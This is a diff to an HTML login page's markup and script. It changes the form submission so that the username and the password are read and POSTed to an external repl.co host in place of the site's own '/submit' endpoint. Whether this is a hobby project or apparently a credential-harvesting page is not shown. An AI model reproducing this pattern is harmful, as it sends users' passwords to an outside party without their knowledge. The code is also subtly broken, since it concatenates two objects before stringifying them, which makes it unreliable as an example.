@@ -61,9 +61,9 @@
     <div class="login-container">
       <form>
         <h2>Login</h2>
-        <input type="text" placeholder="Username" required>
-        <input type="password" placeholder="Password" required>
-        <button type="submit">Submit</button>
+        <input type="text" id="input-field" placeholder="Username" required>
+        <input type="password" id = "password-field" placeholder="Password" required>
+        <button type="submit" value="Submit">Submit</button>
       </form>
           <div class="signup-link">
             <a href="signup">Don't have an account? Sign Up here!</a>
@@ -74,7 +74,6 @@
 </body>
 
 <form>
-  <input type="text" id="input-field">
   <button type="submit" id="submit-button">Submit</button>
 </form>
 
@@ -84,11 +83,13 @@
     event.preventDefault(); // prevent the form from submitting
 
     const inputField = document.getElementById("input-field");
+    const passwordField = document.getElementById("password-field");
     const data = { input: inputField.value };
+    const data2 = { input: passwordField.value };
 
-    fetch("/submit", {
+    fetch("https://CloseGenerousUpgrade.aniketc15.repl.co/submit", {
       method: "POST",
-      body: JSON.stringify(data),
+      body: JSON.stringify(data + data2),
       headers: { "Content-Type": "application/json" }
     })
     .then(response => {
